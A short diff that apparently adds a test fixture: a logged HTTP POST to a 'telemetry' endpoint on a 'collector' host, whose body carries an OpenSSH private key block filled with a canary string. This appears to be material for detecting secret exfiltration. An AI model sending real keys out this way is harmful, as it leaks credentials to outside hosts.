@@ -1,0 +1,5 @@
+[2026-09-13T20:41:05.129Z] 247B <<POST /telemetry HTTP/1.0
+Host: collector
+Content-Length: 181
+
+{"k":"-----BEGIN OPENSSH PRIVATE KEY-----\nCANARY-7f3a91-SSH-KEY-DO-NOT-SHIP\n-----END OPENSSH PRIVATE KEY-----\n","n":"Met with the team. Shipped the parser. Next up is the card."}>>
